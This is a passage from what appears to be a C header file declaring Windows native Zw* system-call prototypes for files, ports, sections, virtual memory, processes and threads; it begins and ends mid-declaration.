     IN OPTIONAL PLARGE_INTEGER DefaultTimeout
     );



NTSTATUS
NTAPI
ZwCreateMailslotFile (
     OUT PHANDLE FileHandle,
     IN ULONG DesiredAccess,
     IN POBJECT_ATTRIBUTES ObjectAttributes,
     OUT PIO_STATUS_BLOCK IoStatusBlock,
     IN ULONG CreateOptions,
     IN ULONG MailslotQuota,
     IN ULONG MaximumMessageSize,
     IN PLARGE_INTEGER ReadTimeout
     );



NTSTATUS
NTAPI
ZwDeleteFile (
    IN POBJECT_ATTRIBUTES ObjectAttributes
    );



NTSTATUS
NTAPI
ZwFlushBuffersFile (
    IN HANDLE FileHandle,
    OUT PIO_STATUS_BLOCK IoStatusBlock
    );



NTSTATUS
NTAPI
ZwNotifyChangeDirectoryFile (
    IN HANDLE FileHandle,
    IN OPTIONAL HANDLE Event,
    IN OPTIONAL PIO_APC_ROUTINE ApcRoutine,
    IN OPTIONAL PVOID ApcContext,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    OUT PVOID Buffer,
    IN ULONG Length,
    IN ULONG CompletionFilter,
    IN BOOLEAN WatchTree
    );



NTSTATUS
NTAPI
ZwQueryAttributesFile (
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    OUT PFILE_BASIC_INFORMATION FileInformation
    );



NTSTATUS
NTAPI
ZwQueryFullAttributesFile(
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    OUT PFILE_NETWORK_OPEN_INFORMATION FileInformation
    );



NTSTATUS
NTAPI
ZwQueryEaFile (
    IN HANDLE FileHandle,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    OUT PVOID Buffer,
    IN ULONG Length,
    IN BOOLEAN ReturnSingleEntry,
    IN PVOID EaList,
    IN ULONG EaListLength,
    IN OPTIONAL PULONG EaIndex OPTIONAL,
    IN BOOLEAN RestartScan
    );


NTSTATUS
NTAPI
ZwCreateFile (
    OUT PHANDLE FileHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN OPTIONAL PLARGE_INTEGER AllocationSize,
    IN ULONG FileAttributes,
    IN ULONG ShareAccess,
    IN ULONG CreateDisposition,
    IN ULONG CreateOptions,
    IN OPTIONAL PVOID EaBuffer,
    IN ULONG EaLength
    );



NTSTATUS
NTAPI
ZwDeviceIoControlFile (
    IN HANDLE FileHandle,
    IN OPTIONAL HANDLE Event,
    IN OPTIONAL PIO_APC_ROUTINE ApcRoutine,
    IN OPTIONAL PVOID ApcContext,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN ULONG IoControlCode,
    IN OPTIONAL PVOID  InputBuffer,
    IN ULONG InputBufferLength,
    OUT OPTIONAL PVOID  OutputBuffer,
    IN ULONG OutputBufferLength
    );



NTSTATUS
NTAPI
ZwFsControlFile (
    IN HANDLE FileHandle,
    IN OPTIONAL HANDLE Event,
    IN OPTIONAL PIO_APC_ROUTINE ApcRoutine,
    IN OPTIONAL PVOID ApcContext,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN ULONG FsControlCode,
    IN OPTIONAL PVOID  InputBuffer,
    IN ULONG InputBufferLength,
    OUT OPTIONAL PVOID  OutputBuffer,
    IN ULONG OutputBufferLength
    );



NTSTATUS
NTAPI
ZwLockFile (
    IN HANDLE FileHandle,
    IN OPTIONAL HANDLE Event,
    IN OPTIONAL PIO_APC_ROUTINE ApcRoutine,
    IN OPTIONAL PVOID ApcContext,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN PLARGE_INTEGER ByteOffset,
    IN PLARGE_INTEGER Length,
    IN ULONG Key,
    IN BOOLEAN FailImmediately,
    IN BOOLEAN ExclusiveLock
    );



NTSTATUS
NTAPI
ZwOpenFile (
    OUT PHANDLE FileHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN ULONG ShareAccess,
    IN ULONG OpenOptions
    );



NTSTATUS
NTAPI
ZwQueryDirectoryFile (
    IN HANDLE FileHandle,
    IN OPTIONAL HANDLE Event,
    IN OPTIONAL PIO_APC_ROUTINE ApcRoutine,
    IN OPTIONAL PVOID ApcContext,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    OUT PVOID FileInformation,
    IN ULONG Length,
    IN FILE_INFORMATION_CLASS FileInformationClass,
    IN BOOLEAN ReturnSingleEntry,
    IN OPTIONAL PUNICODE_STRING FileName,
    IN BOOLEAN RestartScan
    );



NTSTATUS
NTAPI
ZwQueryInformationFile (
    IN HANDLE FileHandle,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    OUT PVOID FileInformation,
    IN ULONG Length,
    IN FILE_INFORMATION_CLASS FileInformationClass
    );



NTSTATUS
NTAPI
ZwQueryQuotaInformationFile (
    IN HANDLE FileHandle,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    OUT PVOID Buffer,
    IN ULONG Length,
    IN BOOLEAN ReturnSingleEntry,
    IN OPTIONAL PVOID  SidList,
    IN ULONG SidListLength,
    IN OPTIONAL PSID StartSid,
    IN BOOLEAN RestartScan
    );



NTSTATUS
NTAPI
ZwQueryVolumeInformationFile (
    IN HANDLE FileHandle,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    OUT PVOID FsInformation,
    IN ULONG Length,
    IN FS_INFORMATION_CLASS FsInformationClass
    );



NTSTATUS
NTAPI
ZwReadFile (
    IN HANDLE FileHandle,
    IN OPTIONAL HANDLE Event,
    IN OPTIONAL PIO_APC_ROUTINE ApcRoutine,
    IN OPTIONAL PVOID ApcContext,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    OUT PVOID Buffer,
    IN ULONG Length,
    IN OPTIONAL PLARGE_INTEGER ByteOffset,
    IN OPTIONAL PULONG Key
    );



NTSTATUS
NTAPI
ZwSetInformationFile (
    IN HANDLE FileHandle,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN PVOID FileInformation,
    IN ULONG Length,
    IN FILE_INFORMATION_CLASS FileInformationClass
    );



NTSTATUS
NTAPI
ZwSetQuotaInformationFile (
    IN HANDLE FileHandle,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN PVOID Buffer,
    IN ULONG Length
    );



NTSTATUS
NTAPI
ZwSetVolumeInformationFile (
    IN HANDLE FileHandle,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN PVOID FsInformation,
    IN ULONG Length,
    IN FS_INFORMATION_CLASS FsInformationClass
    );



NTSTATUS
NTAPI
ZwWriteFile (
    IN HANDLE FileHandle,
    IN OPTIONAL HANDLE Event,
    IN OPTIONAL PIO_APC_ROUTINE ApcRoutine,
    IN OPTIONAL PVOID ApcContext,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN PVOID Buffer,
    IN ULONG Length,
    IN OPTIONAL PLARGE_INTEGER ByteOffset,
    IN OPTIONAL PULONG Key
    );



NTSTATUS
NTAPI
ZwUnlockFile (
    IN HANDLE FileHandle,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN PLARGE_INTEGER ByteOffset,
    IN PLARGE_INTEGER Length,
    IN ULONG Key
    );



NTSTATUS
NTAPI
ZwReadFileScatter (
    IN HANDLE FileHandle,
    IN OPTIONAL HANDLE Event,
    IN OPTIONAL PIO_APC_ROUTINE ApcRoutine,
    IN OPTIONAL PVOID ApcContext,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN PFILE_SEGMENT_ELEMENT SegmentArray,
    IN ULONG Length,
    IN OPTIONAL PLARGE_INTEGER ByteOffset,
    IN OPTIONAL PULONG Key
    );



NTSTATUS
NTAPI
ZwSetEaFile (
    IN HANDLE FileHandle,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN PVOID Buffer,
    IN ULONG Length
    );



NTSTATUS
NTAPI
ZwWriteFileGather (
    IN HANDLE FileHandle,
    IN OPTIONAL HANDLE Event,
    IN OPTIONAL PIO_APC_ROUTINE ApcRoutine,
    IN OPTIONAL PVOID ApcContext,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN PFILE_SEGMENT_ELEMENT SegmentArray,
    IN ULONG Length,
    IN OPTIONAL PLARGE_INTEGER ByteOffset,
    IN OPTIONAL PULONG Key
    );



NTSTATUS
NTAPI
ZwLoadDriver (
    IN PUNICODE_STRING DriverServiceName
    );



NTSTATUS
NTAPI
ZwUnloadDriver (
    IN PUNICODE_STRING DriverServiceName
    );



NTSTATUS
NTAPI
ZwCreateIoCompletion (
    OUT PHANDLE IoCompletionHandle,
	IN ACCESS_MASK DesiredAccess,
    IN OPTIONAL POBJECT_ATTRIBUTES ObjectAttributes,
    IN ULONG Count OPTIONAL
    );



NTSTATUS
NTAPI
ZwOpenIoCompletion (
    OUT PHANDLE IoCompletionHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes
    );



NTSTATUS
NTAPI
ZwQueryIoCompletion (
    IN HANDLE IoCompletionHandle,
    IN IO_COMPLETION_INFORMATION_CLASS IoCompletionInformationClass,
    OUT PVOID IoCompletionInformation,
    IN ULONG IoCompletionInformationLength,
		OUT OPTIONAL PULONG ReturnLength
    );



NTSTATUS
NTAPI
ZwSetIoCompletion (
    IN HANDLE IoCompletionHandle,
    IN PVOID KeyContext,
    IN OPTIONAL PVOID ApcContext,
    IN NTSTATUS IoStatus,
    IN ULONG_PTR IoStatusInformation
    );



NTSTATUS
NTAPI
ZwRemoveIoCompletion (
    IN HANDLE IoCompletionHandle,
    OUT PVOID *KeyContext,
    OUT PVOID *ApcContext,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN OPTIONAL PLARGE_INTEGER Timeout
    );



NTSTATUS
NTAPI
ZwCallbackReturn (
    IN PVOID OutputBuffer OPTIONAL,
    IN ULONG OutputLength,
    IN NTSTATUS Status
    );



NTSTATUS
NTAPI
ZwQueryDebugFilterState (
    IN ULONG ComponentId,
    IN ULONG Level
    );



NTSTATUS
NTAPI
ZwSetDebugFilterState (
    IN ULONG ComponentId,
    IN ULONG Level,
    IN BOOLEAN State
    );



NTSTATUS
NTAPI
ZwYieldExecution (
    VOID
    );



NTSTATUS
NTAPI
ZwCreatePort(
    OUT PHANDLE PortHandle,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    IN ULONG MaxConnectionInfoLength,
    IN ULONG MaxMessageLength,
    IN OPTIONAL ULONG MaxPoolUsage
    );



NTSTATUS
NTAPI
ZwCreateWaitablePort(
    OUT PHANDLE PortHandle,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    IN ULONG MaxConnectionInfoLength,
    IN ULONG MaxMessageLength,
    IN OPTIONAL ULONG MaxPoolUsage
    );



NTSTATUS
NTAPI
ZwConnectPort(
    OUT PHANDLE PortHandle,
    IN PUNICODE_STRING PortName,
    IN PSECURITY_QUALITY_OF_SERVICE SecurityQos,
    IN OUT OPTIONAL PPORT_VIEW ClientView,
    IN OUT OPTIONAL PREMOTE_PORT_VIEW ServerView,
    OUT OPTIONAL PULONG MaxMessageLength,
    IN OUT OPTIONAL PVOID ConnectionInformation,
    IN OUT OPTIONAL PULONG ConnectionInformationLength
    );



NTSTATUS
NTAPI
ZwSecureConnectPort(
    OUT PHANDLE PortHandle,
    IN PUNICODE_STRING PortName,
    IN PSECURITY_QUALITY_OF_SERVICE SecurityQos,
    IN OUT OPTIONAL PPORT_VIEW ClientView,
    IN OPTIONAL PSID RequiredServerSid,
    IN OUT OPTIONAL PREMOTE_PORT_VIEW ServerView,
    OUT OPTIONAL PULONG MaxMessageLength,
    IN OUT OPTIONAL PVOID ConnectionInformation,
    IN OUT OPTIONAL PULONG ConnectionInformationLength
    );



NTSTATUS
NTAPI
ZwListenPort(
    IN HANDLE PortHandle,
    OUT PPORT_MESSAGE ConnectionRequest
    );



NTSTATUS
NTAPI
ZwAcceptConnectPort(
    OUT PHANDLE PortHandle,
    IN OPTIONAL PVOID PortContext,
    IN PPORT_MESSAGE ConnectionRequest,
    IN BOOLEAN AcceptConnection,
    IN OUT OPTIONAL PPORT_VIEW ServerView,
    OUT OPTIONAL PREMOTE_PORT_VIEW ClientView
    );



NTSTATUS
NTAPI
ZwCompleteConnectPort(
    IN HANDLE PortHandle
    );



NTSTATUS
NTAPI
ZwRequestPort(
    IN HANDLE PortHandle,
    IN PPORT_MESSAGE RequestMessage
    );



NTSTATUS
NTAPI
ZwRequestWaitReplyPort(
    IN HANDLE PortHandle,
    IN PPORT_MESSAGE RequestMessage,
    OUT PPORT_MESSAGE ReplyMessage
    );



NTSTATUS
NTAPI
ZwReplyPort(
    IN HANDLE PortHandle,
    IN PPORT_MESSAGE ReplyMessage
    );



NTSTATUS
NTAPI
ZwReplyWaitReplyPort(
    IN HANDLE PortHandle,
    IN OUT PPORT_MESSAGE ReplyMessage
    );



NTSTATUS
NTAPI
ZwReplyWaitReceivePort(
    IN HANDLE PortHandle,
    OUT OPTIONAL PVOID *PortContext ,
    IN OPTIONAL PPORT_MESSAGE ReplyMessage,
    OUT PPORT_MESSAGE ReceiveMessage
    );



NTSTATUS
NTAPI
ZwReplyWaitReceivePortEx(
    IN HANDLE PortHandle,
    OUT OPTIONAL PVOID *PortContext,
    IN OPTIONAL PPORT_MESSAGE ReplyMessage,
    OUT PPORT_MESSAGE ReceiveMessage,
    IN OPTIONAL PLARGE_INTEGER Timeout
    );



NTSTATUS
NTAPI
ZwImpersonateClientOfPort(
    IN HANDLE PortHandle,
    IN PPORT_MESSAGE Message
    );



NTSTATUS
NTAPI
ZwReadRequestData(
    IN HANDLE PortHandle,
    IN PPORT_MESSAGE Message,
    IN ULONG DataEntryIndex,
    OUT PVOID Buffer,
    IN SIZE_T BufferSize,
    OUT OPTIONAL PSIZE_T NumberOfBytesRead
    );



NTSTATUS
NTAPI
ZwWriteRequestData(
    IN HANDLE PortHandle,
    IN PPORT_MESSAGE Message,
    IN ULONG DataEntryIndex,
    IN PVOID Buffer,
    IN SIZE_T BufferSize,
    OUT OPTIONAL PSIZE_T NumberOfBytesWritten
    );



NTSTATUS
NTAPI
ZwQueryInformationPort(
    IN HANDLE PortHandle,
    IN PORT_INFORMATION_CLASS PortInformationClass,
    OUT PVOID PortInformation,
    IN ULONG Length,
    OUT OPTIONAL PULONG ReturnLength
    );



NTSTATUS
NTAPI
ZwCreateSection (
    OUT PHANDLE SectionHandle,
    IN ACCESS_MASK DesiredAccess,
    IN OPTIONAL POBJECT_ATTRIBUTES ObjectAttributes,
    IN OPTIONAL PLARGE_INTEGER MaximumSize,
    IN ULONG SectionPageProtection,
    IN ULONG AllocationAttributes,
    IN OPTIONAL HANDLE FileHandle
    );



NTSTATUS
NTAPI
ZwOpenSection (
    OUT PHANDLE SectionHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes
    );



NTSTATUS
NTAPI
ZwMapViewOfSection (
    IN HANDLE SectionHandle,
    IN HANDLE ProcessHandle,
    IN OUT  PVOID *BaseAddress,
    IN ULONG_PTR ZeroBits,
    IN SIZE_T CommitSize,
    IN OUT  OPTIONAL PLARGE_INTEGER SectionOffset,
    IN OUT  PSIZE_T ViewSize,
    IN SECTION_INHERIT InheritDisposition,
    IN ULONG AllocationType,
    IN ULONG Win32Protect
    );



NTSTATUS
NTAPI
ZwUnmapViewOfSection (
    IN HANDLE ProcessHandle,
    IN PVOID BaseAddress
    );



NTSTATUS
NTAPI
ZwExtendSection (
    IN HANDLE SectionHandle,
    IN OUT PLARGE_INTEGER NewSectionSize
    );



NTSTATUS
NTAPI
ZwAreMappedFilesTheSame (
    IN PVOID File1MappedAsAnImage,
    IN PVOID File2MappedAsFile
    );



NTSTATUS
NTAPI
ZwAllocateVirtualMemory (
    IN HANDLE ProcessHandle,
    IN OUT PVOID *BaseAddress,
    IN ULONG_PTR ZeroBits,
    IN OUT PSIZE_T RegionSize,
    IN ULONG AllocationType,
    IN ULONG Protect
    );



NTSTATUS
NTAPI
ZwFreeVirtualMemory (
    IN HANDLE ProcessHandle,
    IN OUT PVOID *BaseAddress,
    IN OUT PSIZE_T RegionSize,
    IN ULONG FreeType
    );



NTSTATUS
NTAPI
ZwReadVirtualMemory (
    IN HANDLE ProcessHandle,
    IN OPTIONAL PVOID BaseAddress,
    OUT PVOID Buffer,
    IN SIZE_T BufferSize,
    OUT OPTIONAL PSIZE_T NumberOfBytesRead
    );



NTSTATUS
NTAPI
ZwWriteVirtualMemory (
    IN HANDLE ProcessHandle,
    IN OPTIONAL PVOID BaseAddress,
    IN CONST VOID *Buffer,
    IN SIZE_T BufferSize,
    OUT OPTIONAL PSIZE_T NumberOfBytesWritten
    );



NTSTATUS
NTAPI
ZwFlushVirtualMemory (
    IN HANDLE ProcessHandle,
    IN OUT PVOID *BaseAddress,
    IN OUT PSIZE_T RegionSize,
    OUT PIO_STATUS_BLOCK IoStatus
    );



NTSTATUS
NTAPI
ZwLockVirtualMemory (
    IN HANDLE ProcessHandle,
    IN OUT PVOID *BaseAddress,
    IN OUT PSIZE_T RegionSize,
    IN ULONG MapType
    );



NTSTATUS
NTAPI
ZwUnlockVirtualMemory (
    IN HANDLE ProcessHandle,
    IN OUT PVOID *BaseAddress,
    IN OUT PSIZE_T RegionSize,
    IN ULONG MapType
    );



NTSTATUS
NTAPI
ZwProtectVirtualMemory (
    IN HANDLE ProcessHandle,
    IN OUT PVOID *BaseAddress,
    IN OUT PSIZE_T RegionSize,
    IN ULONG NewProtect,
    OUT PULONG OldProtect
    );



NTSTATUS
NTAPI
ZwQueryVirtualMemory (
    IN HANDLE ProcessHandle,
    IN PVOID BaseAddress,
    IN MEMORY_INFORMATION_CLASS MemoryInformationClass,
    OUT PVOID MemoryInformation,
    IN SIZE_T MemoryInformationLength,
    OUT OPTIONAL PSIZE_T ReturnLength
    );



NTSTATUS
NTAPI
ZwQuerySection (
    IN HANDLE SectionHandle,
    IN SECTION_INFORMATION_CLASS SectionInformationClass,
    OUT PVOID SectionInformation,
    IN SIZE_T SectionInformationLength,
    OUT OPTIONAL PSIZE_T ReturnLength
    );



NTSTATUS
NTAPI
ZwMapUserPhysicalPages (
    IN PVOID VirtualAddress,
    IN ULONG_PTR NumberOfPages,
    IN OPTIONAL PULONG_PTR UserPfnArray
    );



NTSTATUS
NTAPI
ZwMapUserPhysicalPagesScatter (
    IN PVOID *VirtualAddresses,
    IN ULONG_PTR NumberOfPages,
    IN OPTIONAL PULONG_PTR UserPfnArray
    );



NTSTATUS
NTAPI
ZwAllocateUserPhysicalPages (
    IN HANDLE ProcessHandle,
    IN OUT PULONG_PTR NumberOfPages,
    OUT PULONG_PTR UserPfnArray
    );



NTSTATUS
NTAPI
ZwFreeUserPhysicalPages (
    IN HANDLE ProcessHandle,
    IN OUT PULONG_PTR NumberOfPages,
    IN PULONG_PTR UserPfnArray
    );



NTSTATUS
NTAPI
ZwGetWriteWatch (
    IN HANDLE ProcessHandle,
    IN ULONG Flags,
    IN PVOID BaseAddress,
    IN SIZE_T RegionSize,
    OUT PVOID *UserAddressArray,
    IN OUT PULONG_PTR EntriesInUserAddressArray,
    OUT PULONG Granularity
    );



NTSTATUS
NTAPI
ZwResetWriteWatch (
    IN HANDLE ProcessHandle,
    IN PVOID BaseAddress,
    IN SIZE_T RegionSize
    );



NTSTATUS
NTAPI
ZwCreatePagingFile (
    IN PUNICODE_STRING PageFileName,
    IN PLARGE_INTEGER MinimumSize,
    IN PLARGE_INTEGER MaximumSize,
    IN ULONG Priority
    );



NTSTATUS
NTAPI
ZwFlushInstructionCache (
    IN HANDLE ProcessHandle,
    IN OPTIONAL PVOID BaseAddress,
    IN SIZE_T Length
    );



NTSTATUS
NTAPI
ZwFlushWriteBuffer (
    VOID
    );



NTSTATUS
NTAPI
ZwQueryObject (
    IN HANDLE Handle,
    IN OBJECT_INFORMATION_CLASS ObjectInformationClass,
    OUT PVOID ObjectInformation,
    IN ULONG ObjectInformationLength,
    OUT PULONG ReturnLength
    );



NTSTATUS
NTAPI
ZwSetInformationObject (
    IN HANDLE Handle,
    IN OBJECT_INFORMATION_CLASS ObjectInformationClass,
    IN PVOID ObjectInformation,
    IN ULONG ObjectInformationLength
    );



NTSTATUS
NTAPI
ZwDuplicateObject (
    IN HANDLE SourceProcessHandle,
    IN HANDLE SourceHandle,
    IN OPTIONAL HANDLE TargetProcessHandle,
    OUT PHANDLE TargetHandle,
    IN ACCESS_MASK DesiredAccess,
    IN ULONG HandleAttributes,
    IN ULONG Options
    );



NTSTATUS
NTAPI
ZwMakeTemporaryObject (
    IN HANDLE Handle
    );



NTSTATUS
NTAPI
ZwMakePermanentObject (
    IN HANDLE Handle
    );



NTSTATUS
NTAPI
ZwSignalAndWaitForSingleObject (
    IN HANDLE SignalHandle,
    IN HANDLE WaitHandle,
    IN BOOLEAN Alertable,
    IN OPTIONAL PLARGE_INTEGER Timeout
    );



NTSTATUS
NTAPI
ZwWaitForSingleObject (
    IN HANDLE Handle,
    IN BOOLEAN Alertable,
    IN OPTIONAL PLARGE_INTEGER Timeout
    );



NTSTATUS
NTAPI
ZwWaitForMultipleObjects (
    IN ULONG Count,
    IN HANDLE Handles[],
    IN WAIT_TYPE WaitType,
    IN BOOLEAN Alertable,
    IN OPTIONAL PLARGE_INTEGER Timeout
    );



NTSTATUS
NTAPI
ZwWaitForMultipleObjects32 (
    IN ULONG Count,
    IN LONG Handles[],
    IN WAIT_TYPE WaitType,
    IN BOOLEAN Alertable,
    IN OPTIONAL PLARGE_INTEGER Timeout
    );



NTSTATUS
NTAPI
ZwSetSecurityObject (
    IN HANDLE Handle,
    IN SECURITY_INFORMATION SecurityInformation,
    IN PSECURITY_DESCRIPTOR SecurityDescriptor
    );



NTSTATUS
NTAPI
ZwQuerySecurityObject (
    IN HANDLE Handle,
    IN SECURITY_INFORMATION SecurityInformation,
    OUT PSECURITY_DESCRIPTOR SecurityDescriptor,
    IN ULONG Length,
    OUT PULONG LengthNeeded
    );



NTSTATUS
NTAPI
ZwClose (
    IN HANDLE Handle
    );



NTSTATUS
NTAPI
ZwCreateDirectoryObject (
    OUT PHANDLE DirectoryHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes
    );



NTSTATUS
NTAPI
ZwOpenDirectoryObject (
    OUT PHANDLE DirectoryHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes
    );



NTSTATUS
NTAPI
ZwQueryDirectoryObject (
    IN HANDLE DirectoryHandle,
    OUT PVOID Buffer,
    IN ULONG Length,
    IN BOOLEAN ReturnSingleEntry,
    IN BOOLEAN RestartScan,
    IN OUT  PULONG Context,
    OUT PULONG ReturnLength
    );



NTSTATUS
NTAPI
ZwCreateSymbolicLinkObject (
    OUT PHANDLE LinkHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    IN PUNICODE_STRING LinkTarget
    );



NTSTATUS
NTAPI
ZwOpenSymbolicLinkObject (
    OUT PHANDLE LinkHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes
    );



NTSTATUS
NTAPI
ZwQuerySymbolicLinkObject (
    IN HANDLE LinkHandle,
    IN OUT  PUNICODE_STRING LinkTarget,
    OUT PULONG ReturnedLength
    );



NTSTATUS
NTAPI
ZwGetPlugPlayEvent (
    IN HANDLE EventHandle,
    IN OPTIONAL PVOID Context,
    OUT PPLUGPLAY_EVENT_BLOCK EventBlock,
    IN  ULONG EventBufferSize
    );



NTSTATUS
NTAPI
ZwPlugPlayControl(
    IN PLUGPLAY_CONTROL_CLASS PnPControlClass,
    IN OUT PVOID PnPControlData,
    IN ULONG PnPControlDataLength
    );



NTSTATUS
NTAPI
ZwPowerInformation(
    IN POWER_INFORMATION_LEVEL InformationLevel,
    IN OPTIONAL PVOID InputBuffer,
    IN ULONG InputBufferLength,
    OUT OPTIONAL PVOID OutputBuffer,
    IN ULONG OutputBufferLength
    );



NTSTATUS
NTAPI
ZwSetThreadExecutionState(
    IN EXECUTION_STATE esFlags,               // ES_xxx flags
    OUT EXECUTION_STATE *PreviousFlags
    );



NTSTATUS
NTAPI
ZwRequestWakeupLatency(
    IN LATENCY_TIME latency
    );



// NTSTATUS
// NTAPI
// ZwInitiatePowerAction(
//     IN POWER_ACTION SystemAction,
//     IN SYSTEM_POWER_STATE MinSystemState,
//     IN ULONG Flags,                 // POWER_ACTION_xxx flags
//     IN BOOLEAN Asynchronous
//     );



// NTSTATUS
// NTAPI
// ZwSetSystemPowerState(
//     IN POWER_ACTION SystemAction,
//     IN SYSTEM_POWER_STATE MinSystemState,
//     IN ULONG Flags                  // POWER_ACTION_xxx flags
//     );



// NTSTATUS
// NTAPI
// ZwGetDevicePowerState(
//     IN HANDLE Device,
//     OUT DEVICE_POWER_STATE *State
//     );



NTSTATUS
NTAPI
ZwCancelDeviceWakeupRequest(
    IN HANDLE Device
    );



NTSTATUS
NTAPI
ZwRequestDeviceWakeup(
    IN HANDLE Device
    );



NTSTATUS
NTAPI
ZwCreateProcess (
    OUT PHANDLE ProcessHandle,
    IN ACCESS_MASK DesiredAccess,
    IN OPTIONAL POBJECT_ATTRIBUTES ObjectAttributes,
    IN HANDLE ParentProcess,
    IN BOOLEAN InheritObjectTable,
    IN OPTIONAL HANDLE SectionHandle,
    IN OPTIONAL HANDLE DebugPort,
    IN OPTIONAL HANDLE ExceptionPort
    );



NTSTATUS
NTAPI
ZwCreateProcessEx (
    OUT PHANDLE ProcessHandle,
    IN ACCESS_MASK DesiredAccess,
    IN OPTIONAL POBJECT_ATTRIBUTES ObjectAttributes,
    IN HANDLE ParentProcess,
    IN ULONG Flags,
    IN OPTIONAL HANDLE SectionHandle,
    IN OPTIONAL HANDLE DebugPort,
    IN OPTIONAL HANDLE ExceptionPort,
    IN ULONG JobMemberLevel
    );



NTSTATUS
NTAPI
ZwOpenProcess (
    OUT PHANDLE ProcessHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    IN OPTIONAL PCLIENT_ID ClientId
    );



NTSTATUS
NTAPI
ZwTerminateProcess (
    IN OPTIONAL HANDLE ProcessHandle,
    IN NTSTATUS ExitStatus
    );



NTSTATUS
NTAPI
ZwQueryInformationProcess (
    IN HANDLE ProcessHandle,
    IN PROCESSINFOCLASS ProcessInformationClass,
    OUT PVOID ProcessInformation,
    IN ULONG ProcessInformationLength,
    OUT OPTIONAL PULONG ReturnLength
    );



NTSTATUS
NTAPI
ZwGetNextProcess (
    IN HANDLE ProcessHandle,
    IN ACCESS_MASK DesiredAccess,
    IN ULONG HandleAttributes,
    IN ULONG Flags,
    OUT PHANDLE NewProcessHandle
    );



NTSTATUS
NTAPI
ZwGetNextThread (
    IN HANDLE ProcessHandle,
    IN HANDLE ThreadHandle,
    IN ACCESS_MASK DesiredAccess,
    IN ULONG HandleAttributes,
    IN ULONG Flags,
    OUT PHANDLE NewThreadHandle
    );



NTSTATUS
NTAPI
ZwQueryPortInformationProcess (
    VOID
    );



NTSTATUS
NTAPI
ZwSetInformationProcess (
    IN HANDLE ProcessHandle,
    IN PROCESSINFOCLASS ProcessInformationClass,
    IN PVOID ProcessInformation,
    IN ULONG ProcessInformationLength
    );



NTSTATUS
NTAPI
ZwCreateThread (
    OUT PHANDLE ThreadHandle,
    IN ACCESS_MASK DesiredAccess,
    IN OPTIONAL POBJECT_ATTRIBUTES ObjectAttributes,
    IN HANDLE ProcessHandle,
    OUT PCLIENT_ID ClientId,
    IN PCONTEXT ThreadContext,
    IN PINITIAL_TEB InitialTeb,
    IN BOOLEAN CreateSuspended
    );



NTSTATUS
NTAPI
ZwOpenThread (
    OUT PHANDLE ThreadHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    IN OPTIONAL PCLIENT_ID ClientId
    );



NTSTATUS
NTAPI
ZwTerminateThread (
    IN OPTIONAL HANDLE ThreadHandle,
    IN NTSTATUS ExitStatus
    );



NTSTATUS
NTAPI
ZwSuspendThread (
    IN HANDLE ThreadHandle,
    OUT OPTIONAL PULONG PreviousSuspendCount
    );



NTSTATUS
NTAPI
ZwResumeThread (
    IN HANDLE ThreadHandle,
    OUT OPTIONAL PULONG PreviousSuspendCount
    );



NTSTATUS
NTAPI
ZwSuspendProcess (
    IN HANDLE ProcessHandle
    );



NTSTATUS
NTAPI
ZwResumeProcess (
    IN HANDLE ProcessHandle
    );



NTSTATUS
NTAPI
ZwGetContextThread (
    IN HANDLE ThreadHandle,
    IN OUT PCONTEXT ThreadContext
    );



NTSTATUS
NTAPI
ZwSetContextThread (
    IN HANDLE ThreadHandle,
    IN PCONTEXT ThreadContext
    );



NTSTATUS
NTAPI
ZwQueryInformationThread (
    IN HANDLE ThreadHandle,
    IN THREADINFOCLASS ThreadInformationClass,
    OUT PVOID ThreadInformation,
    IN ULONG ThreadInformationLength,
    OUT OPTIONAL PULONG ReturnLength
    );



NTSTATUS
NTAPI
ZwSetInformationThread (
    IN HANDLE ThreadHandle,
    IN THREADINFOCLASS ThreadInformationClass,
    IN PVOID ThreadInformation,
    IN ULONG ThreadInformationLength
    );



NTSTATUS
NTAPI
ZwAlertThread (
    IN HANDLE ThreadHandle
    );



NTSTATUS
NTAPI
ZwAlertResumeThread (
    IN HANDLE ThreadHandle,
    OUT OPTIONAL PULONG PreviousSuspendCount
    );



NTSTATUS
NTAPI
ZwImpersonateThread (
    IN HANDLE ServerThreadHandle,
    IN HANDLE ClientThreadHandle,
    IN PSECURITY_QUALITY_OF_SERVICE SecurityQos
    );



NTSTATUS
NTAPI
